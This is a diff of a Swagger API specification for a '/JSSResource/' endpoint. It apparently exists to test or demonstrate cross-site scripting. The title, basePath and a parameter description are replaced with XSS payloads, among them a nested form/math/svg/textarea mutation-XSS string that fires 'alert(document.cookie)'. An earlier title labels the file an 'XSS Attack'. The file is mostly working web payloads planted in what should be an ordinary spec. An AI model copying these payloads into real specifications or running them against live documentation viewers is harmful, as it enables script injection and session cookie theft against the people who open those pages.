@@ -1,9 +1,9 @@
-swagger: "2.0"
+swagger: '2.0'
 info:
-  title: XSS Attack BY M0X0101
+  title: <img src=x on onerror=alert()>
   description: |
   version: production
-basePath: /JSSResource/
+basePath: /JSSResource/ <img src=x on onerror=alert()>
 produces:
   - application/xml
   - application/json
@@ -26,7 +26,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+<mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"
           format: int64
           in: path
           name: id
